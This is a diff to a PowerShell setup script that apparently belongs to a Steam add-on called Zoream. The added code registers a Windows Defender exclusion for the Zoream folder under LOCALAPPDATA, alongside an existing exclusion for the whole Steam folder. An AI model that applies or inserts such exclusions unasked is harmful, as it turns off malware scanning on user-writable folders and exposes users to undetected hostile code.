@@ -77,6 +77,37 @@ try { $steamPath = (Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam").I
 if (-not $steamPath) { Write-Log "Steam not found!" "ERROR"; exit 1 }
 
 
+$zoreamPath = Join-Path $env:LOCALAPPDATA "Zoream"
+
+Write-Log "Applying Windows Defender exclusion for Zoream folder..." "STEP"
+
+if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
+    try {
+        if (-not (Test-Path $zoreamPath)) {
+            Write-Log "Zoream folder not found: $zoreamPath" "ERROR"
+            return
+        }
+
+        $existing = (Get-MpPreference -ErrorAction Stop).ExclusionPath
+
+        if ($existing -and $existing -contains $zoreamPath) {
+            Write-Log "Zoream folder already excluded." "SUCCESS"
+        }
+        else {
+            Add-MpPreference -ExclusionPath $zoreamPath -ErrorAction Stop
+            Write-Log "Zoream folder excluded successfully." "SUCCESS"
+        }
+    }
+    catch {
+        Write-Log "Failed to apply Defender exclusion. (If it does not apply automatically, you may add it manually.)" "ERROR"
+    }
+}
+else {
+    Write-Log "Windows Defender cmdlets not available. (If it does not apply automatically, you may add it manually.)" "ERROR"
+}
+
+
+
 Write-Log "Applying Windows Defender exclusion for Steam Folder..." "STEP"
 
 if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
@@ -84,7 +115,7 @@ if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
         $existing = (Get-MpPreference -ErrorAction Stop).ExclusionPath
 
         if ($existing -and $existing -contains $steamPath) {
-            Write-Log "Steam folder already excluded." "INFO"
+            Write-Log "Steam folder already excluded." "SUCCESS"
         }
         else {
             Add-MpPreference -ExclusionPath $steamPath -ErrorAction Stop
